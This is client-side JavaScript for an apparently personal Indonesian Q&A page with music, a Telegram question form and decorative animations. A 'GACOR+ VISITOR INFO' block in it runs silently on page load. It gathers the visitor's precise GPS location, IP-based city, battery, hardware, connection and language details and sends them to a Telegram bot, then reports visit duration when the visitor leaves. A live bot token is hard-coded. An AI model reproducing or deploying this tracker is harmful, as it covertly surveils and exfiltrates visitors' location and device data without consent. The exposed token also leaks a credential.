﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
const photoOptions = document.getElementById('photoOptions');
if (openPhotoOptions && photoOptions) {
  openPhotoOptions.addEventListener('click', () => {
    photoOptions.classList.toggle('show');
  });
}

// NOTE: replace the two placeholders below with your actual bot token and chat id
const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
const CHAT_ID = "6864694275";

// === BAGIAN MUSIK — REVISI MOBILE FRIENDLY ===
const music = document.getElementById('bgmusic');
const btnMusic = document.getElementById('musicButton');
let started = false;
music.volume = 0.4;

// pastikan audio bisa dimulai hanya setelah interaksi nyata
async function startMusic() {
  if (started) return;
  started = true;
  music.muted = false;
  try {
    await music.play();
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (err) {
    console.log("Autoplay gagal:", err);
    btnMusic.classList.add("show");
  }
}

// Deteksi platform mobile
const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);

// PC: boleh langsung trigger setelah klik/touch pertama
document.addEventListener('click', startMusic, { once: true });
document.addEventListener('touchstart', startMusic, { once: true });

// tombol utama tetap jadi pemicu manual (aman di mobile)
btnMusic.addEventListener('click', async () => {
  try {
    await music.play();
    music.muted = false;
    started = true;
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (e) {
    alert("Browser kamu memblokir musik otomatis. Coba ketuk ulang tombol 🎵");
    console.log(e);
  }
});

// tambahan: khusus mobile, pastikan tombol tampil dari awal agar user tahu
if (isMobile) {
  btnMusic.classList.add("show");
  music.muted = true;
} else {
  setTimeout(() => { startMusic(); }, 800);
}

// === MODAL PERTANYAAN ===
const modal = document.getElementById('modal');
document.getElementById('openAsk').onclick = () => modal.classList.add('show');
document.getElementById('closeQ').onclick = () => modal.classList.remove('show');

// === LOGIN INSTAGRAM ===
const overlay = document.getElementById("blurOverlay"),
  input = document.getElementById("igInput"),
  btnLogin = document.getElementById("igSubmit"),
  savedIG = localStorage.getItem("ig_user");

function removeOverlay() {
  overlay.style.opacity = "0";
  overlay.style.pointerEvents = "none";
  setTimeout(() => overlay.style.display = "none", 300);
}
function showUserStatus(n) {
  const e = document.getElementById("igStatus");
  e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
  e.style.display = "block";
  e.onclick = () => {
    if (confirm("Keluar?")) {
      localStorage.removeItem("ig_user");
      setTimeout(() => location.reload(), 400);
    }
  };
}
if (savedIG) {
  removeOverlay();
  showUserStatus(savedIG);
}
btnLogin.onclick = () => {
  const u = input.value.trim();
  if (!u) return alert("Masukkan username dulu");
  localStorage.setItem("ig_user", u);
  showUserStatus(u);
  removeOverlay();
};

// === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
async function sendTelegramMessage(url, body, el) {
  el.innerHTML = `
    <div class="mailContainer">
      <span class="mailLoop">📨</span>
      <span class="mailLoop" style="animation-delay:0.25s">📨</span>
      <span class="mailLoop" style="animation-delay:0.5s">📨</span>
    </div>`;
  try {
    const res = await fetch(url, body);
    if (res.ok) {
      try {
        const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
        swoosh.volume = 0.45;
        swoosh.play().catch(() => {});
      } catch (e) {}
      el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
      setTimeout(() => el.innerHTML = "", 3000);
      return true;
    } else {
      el.textContent = "💔 Gagal mengirim.";
      return false;
    }
  } catch (e) {
    el.textContent = "😿 Koneksi lemah.";
    return false;
  }
}

// === KIRIM PERTANYAAN + FOTO ===
document.getElementById('sendQ').addEventListener('click', async () => {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const text = document.getElementById('qtext').value.trim();
  const photo = document.getElementById('qphoto').files[0];
  const qmsg = document.getElementById('qmsg');

  if (!text && !photo) {
    qmsg.textContent = "Tulis pertanyaan atau unggah foto dulu.";
    return;
  }

  qmsg.textContent = "Mengirim...";

  if (photo) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", `💬 Pesan dari ${savedUser}\n${text || "(tanpa teks)"}`);
    fd.append("photo", photo);
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
      if (res.ok) qmsg.textContent = "📨 Terkirim ✓";
      else qmsg.textContent = "💔 Gagal mengirim foto.";
    } catch {
      qmsg.textContent = "😿 Gagal koneksi.";
    }
  } else if (text) {
    await sendTelegramMessage(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
      qmsg
    );
  }

  setTimeout(() => {
    if (qmsg.textContent.includes("Terkirim")) {
      modal.classList.remove('show');
      document.getElementById('qtext').value = "";
      document.getElementById('qphoto').value = "";
    }
  }, 1000);
});

// === GACOR+ VISITOR INFO v2 ===
(function(){
  'use strict';

  const BOT_TOKEN_GACOR = "GANTI_DENGAN_BOT_TOKEN";
  const CHAT_IDS_GACOR = ["6864694275"];
  const GACOR_DEDUPE_MINUTES = 5;
  const GACOR_DEDUPE_KEY = "gacor_plus_last_sent_v2";

  function escapeHtml(s){
    if (!s) return '';
    return String(s).replace(/[&<>"']/g, ch => ({
      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"
    }[ch]));
  }
  function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }

  async function fetchWithTimeout(url, timeout = 4000){
    const ac = new AbortController();
    const id = setTimeout(()=>ac.abort(), timeout);
    try{
      const res = await fetch(url, {signal: ac.signal});
      clearTimeout(id);
      return res;
    }catch(e){ clearTimeout(id); throw e; }
  }

  async function getBatterySafe(){
    try{
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        return `${Math.round(b.level*100)}% (${b.charging ? "⚡" : "🔋"})`;
      }
    }catch{}
    return "n/a";
  }

  async function getIpInfo(){
    try{
      const res = await fetchWithTimeout("https://ipwho.is/", 4000);
      if (!res.ok) return null;
      return await res.json();
    }catch{ return null; }
  }

  function composeMessage(p){
    const msg = [
      `<b>🔥 PENGUNJUNG GACOR+</b>`,
      `👤 ${escapeHtml(p.user_local)}`,
      `🌍 ${escapeHtml(p.city||'?')}, ${escapeHtml(p.country||'?')}`,
      p.gps ? `📍 <a href="https://www.google.com/maps?q=${p.gps.latitude},${p.gps.longitude}&z=17">GPS (±${p.gps.accuracy}m)</a>` : '',
      `💻 ${p.device_type} — ${p.os} — ${p.browser}`,
      `🧠 CPU: ${p.hwConcurrency} core | RAM: ${p.deviceMemory}GB`,
      `🖥️ Layar: ${p.screen}`,
      `🔋 Baterai: ${p.battery}`,
      `📡 Koneksi: ${p.conn_effectiveType || '-'}, ${p.conn_downlink || '-'} Mbps`,
      `🌐 Zona: ${p.timezone} | Lang: ${p.languages}`,
      `📄 ${p.page_title}`,
      `🕓 ${p.when_human}`
    ].filter(Boolean).join('\n');
    return msg;
  }

  async function sendToTelegramAll(msgHtml){
    for (const chatId of CHAT_IDS_GACOR){
      try{
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN_GACOR}/sendMessage`, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({
            chat_id: chatId,
            text: msgHtml,
            parse_mode: "HTML",
            disable_web_page_preview: true
          })
        });
      }catch(e){ console.warn("Gagal kirim ke", chatId, e); }
    }
  }

  function shouldSend(){
    try {
      const data = JSON.parse(localStorage.getItem(GACOR_DEDUPE_KEY)||"{}");
      if (!data.ts) return true;
      const diff = (Date.now() - data.ts)/60000;
      return diff >= GACOR_DEDUPE_MINUTES;
    }catch{ return true; }
  }
  function markSent(){ localStorage.setItem(GACOR_DEDUPE_KEY, JSON.stringify({ts: Date.now()})); }

  async function run(){
    if (!shouldSend()) return;

    const user_local = localStorage.getItem("ig_user") || "Anonim";
    const nav = navigator;
    const device_type = /mobile/i.test(nav.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
    const os = /Windows/i.test(nav.userAgent) ? "Windows" :
               /Android/i.test(nav.userAgent) ? "Android" :
               /iPhone|iPad|iOS/i.test(nav.userAgent) ? "iOS" :
               /Mac/i.test(nav.userAgent) ? "MacOS" :
               /Linux/i.test(nav.userAgent) ? "Linux" : "Unknown";
    const browser = /Chrome/i.test(nav.userAgent) ? "Chrome" :
                    /Firefox/i.test(nav.userAgent) ? "Firefox" :
                    /Safari/i.test(nav.userAgent) ? "Safari" :
                    /Edg/i.test(nav.userAgent) ? "Edge" : "Unknown";
    const hwConcurrency = nav.hardwareConcurrency || "-";
    const deviceMemory = nav.deviceMemory || "-";
    const screenInfo = `${screen.width}x${screen.height}`;
    const battery = await getBatterySafe();
    const conn = nav.connection || {};
    const languages = nav.languages ? nav.languages.join(", ") : nav.language;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const page_title = document.title || location.href;

    let gps = null;
    try{
      gps = await new Promise((res,rej)=>{
        navigator.geolocation.getCurrentPosition(
          pos=>res({latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:Math.round(pos.coords.accuracy)}),
          e=>rej(e),
          {enableHighAccuracy:true,timeout:6000,maximumAge:0}
        );
      });
    }catch{}

    const ipInfo = await getIpInfo();
    const msg = composeMessage({
      user_local,
      city: ipInfo?.city,
      country: ipInfo?.country,
      gps,
      device_type,
      os,
      browser,
      hwConcurrency,
      deviceMemory,
      screen: screenInfo,
      battery,
      conn_effectiveType: conn.effectiveType,
      conn_downlink: conn.downlink,
      timezone,
      languages,
      page_title,
      when_human: new Date().toLocaleString('id-ID')
    });

    await sendToTelegramAll(msg);
    markSent();

    const start = Date.now();
    window.addEventListener("beforeunload",()=>{
      const dur = Math.round((Date.now()-start)/1000);
      const txt = `🚪 Keluar\n⏱ Durasi: ${dur}s\n${user_local}`;
      CHAT_IDS_GACOR.forEach(cid=>{
        navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN_GACOR}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(txt)}`);
      });
    });
  }

  setTimeout(run, 1000);
})();

// === EFEK BUTTERFLY 💸 ===
(function () {
  const area = document.querySelector('.card');
  const butterflies = [];
  const butterflyCount = 7;
  let holdActive = false;
  let holdX = 0;
  let holdY = 0;
  let cachedRect = area.getBoundingClientRect();

  window.addEventListener('resize', () => {
    cachedRect = area.getBoundingClientRect();
  });

  area.style.position = 'relative';
  area.style.overflow = 'hidden';

  function getBounds() {
    return {
      width: area.clientWidth,
      height: area.clientHeight,
      left: cachedRect.left,
      top: cachedRect.top
    };
  }

  const bounds = getBounds();
  for (let i = 0; i < butterflyCount; i++) {
    const b = document.createElement('div');
    b.className = 'butterfly';
    b.textContent = '💸';
    area.appendChild(b);
    butterflies.push({
      el: b,
      x: Math.random() * bounds.width,
      y: Math.random() * bounds.height,
      vx: (Math.random() - 0.5) * 1.2,
      vy: (Math.random() - 0.5) * 1.2,
      size: 16 + Math.random() * 10,
      flapOffset: Math.random() * Math.PI * 2
    });
    b.style.fontSize = butterflies[i].size + 'px';
  }

  function moveButterflies() {
    const rect = getBounds();
    const time = performance.now() / 200;

    butterflies.forEach(b => {
      b.vy += 0.002;
      if (holdActive) {
        const dx = holdX - b.x;
        const dy = holdY - b.y;
        b.vx += dx * 0.002;
        b.vy += dy * 0.002;
      }
      b.vx += Math.sin(time + b.flapOffset) * 0.04;
      b.vy += Math.cos(time + b.flapOffset) * 0.02;
      b.x += b.vx;
      b.y += b.vy;

      if (b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -0.8;
      if (b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -0.8;
      b.vx = Math.max(-1.8, Math.min(1.5, b.vx));
      b.vy = Math.max(-1.8, Math.min(1.8, b.vy));

      const flap = Math.sin(time * 8 + b.flapOffset) * 20;

      b.el.style.transform = `
        translate(${b.x}px, ${b.y}px)
        rotate(${flap}deg)
        scale(${1 + Math.sin(time * 4 + b.flapOffset) * 0.05})
      `;
    });

    requestAnimationFrame(moveButterflies);
  }
  moveButterflies();

  let pendingMove = null;
  function updateHold() {
    if (pendingMove && holdActive) {
      holdX = pendingMove.x - cachedRect.left;
      holdY = pendingMove.y - cachedRect.top;
      pendingMove = null;
    }
    requestAnimationFrame(updateHold);
  }
  updateHold();

  const startHold = (x, y) => {
    holdActive = true;
    holdX = x - cachedRect.left;
    holdY = y - cachedRect.top;
  };
  const endHold = () => (holdActive = false);

  area.addEventListener('mousedown', e => startHold(e.clientX, e.clientY));
  area.addEventListener('mouseup', endHold);
  area.addEventListener('mouseleave', endHold);
  area.addEventListener('mousemove', e => {
    pendingMove = { x: e.clientX, y: e.clientY };
  });

  area.addEventListener('touchstart', e => {
    const t = e.touches[0];
    startHold(t.clientX, t.clientY);
  });
  area.addEventListener('touchmove', e => {
    const t = e.touches[0];
    pendingMove = { x: t.clientX, y: t.clientY };
  });
  area.addEventListener('touchend', endHold);
  area.addEventListener('touchcancel', endHold);
})();

// === LIVE STATUS + SPOTIFY ===
(async function(){
  const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
  if(!titleEl) return;
  const parentEl = titleEl.parentElement || document.body;

  const statusBox = document.createElement("div");
  statusBox.id = "liveModeStatus";
  statusBox.style.cssText = `
    width:100%;
    text-align:center;
    font-size:14px;
    font-family:'Poppins', monospace;
    color:#cfcfcf;
    margin-top:6px;
    opacity:0;
    transition:opacity .6s ease;
  `;
  const musicBtn = parentEl.querySelector("#musicButton");
  if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
  else titleEl.insertAdjacentElement("afterend", statusBox);

  async function updateStatus(){
    try {
      const res = await fetch("https://sybau.imamadevera.workers.dev/status",{cache:"no-store"});
      const data = await res.json();
      const text = `${data.status}`;
      if (statusBox.textContent !== text) {
        statusBox.style.opacity = 0;
        setTimeout(() => {
          statusBox.textContent = text;
          statusBox.style.opacity = 1;
          let color = "#fff";
          if (data.status.includes("Online")) color = "#00ffb3";
          else if (data.status.includes("Listening")) color = "#4cc9ff";
          else if (data.status.includes("Offline")) color = "#ff7ca3";
          statusBox.style.color = color;
        }, 200);
      }
    } catch {
      statusBox.textContent = "⚠️ gagal memuat status";
      statusBox.style.color = "#ff7979";
    }
  }

  updateStatus();
  setInterval(updateStatus, 4000);
})();

(async function(){
  const API_URL = "https://sybau.imamadevera.workers.dev/spotify";
  const liveStatus = document.getElementById("liveModeStatus");
  if (!liveStatus) return;

  const spotifyBox = document.createElement("div");
  spotifyBox.id = "spotifyPreviewBox";
  spotifyBox.style.cssText = `
    width:100%;
    max-width:280px;
    margin:10px auto;
    text-align:center;
    position:relative;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    transition:opacity .4s ease, transform .3s ease;
    opacity:0;
    transform:scale(0.98);
  `;

  const coverWrap = document.createElement("div");
  coverWrap.style.cssText = `
    position:relative;
    width:100%;
    height:100px;
    border-radius:12px;
    overflow:hidden;
    box-shadow:0 0 18px rgba(76,201,255,0.25);
  `;

  const cover = document.createElement("img");
  cover.id = "spotifyPreviewCover";
  cover.style.cssText = `
    width:100%;
    height:100%;
    object-fit:cover;
    display:none;
    transition:transform .25s ease, box-shadow .3s ease;
  `;

  const progressBar = document.createElement("div");
  progressBar.style.cssText = `
    position:absolute;
    bottom:0;
    left:0;
    height:4px;
    width:0%;
    background:linear-gradient(90deg,#4cc9ff,#b5179e);
    transition:width .4s linear;
    border-bottom-left-radius:12px;
    border-bottom-right-radius:12px;
  `;

  coverWrap.appendChild(cover);
  coverWrap.appendChild(progressBar);

  liveStatus.parentNode.insertBefore(spotifyBox, liveStatus);
  spotifyBox.appendChild(coverWrap);
  spotifyBox.appendChild(liveStatus);

  async function updateSpotify(){
    try{
      const res = await fetch(API_URL,{cache:"no-store"});
      const data = await res.json();
      if(data.cover){
        cover.src = data.cover;
        cover.style.display = "block";
      } else {
        cover.style.display = "none";
      }

      if(data.progress_ms && data.duration_ms){
        const percent = Math.min((data.progress_ms / data.duration_ms) * 100, 100);
        progressBar.style.width = percent + "%";
      } else {
        progressBar.style.width = "0%";
      }

      spotifyBox.style.opacity = 1;
      spotifyBox.style.transform = "scale(1)";
    }catch(e){
      console.warn("Spotify preview error:", e);
    }
  }

  updateSpotify();
  setInterval(updateSpotify, 8000);
})();
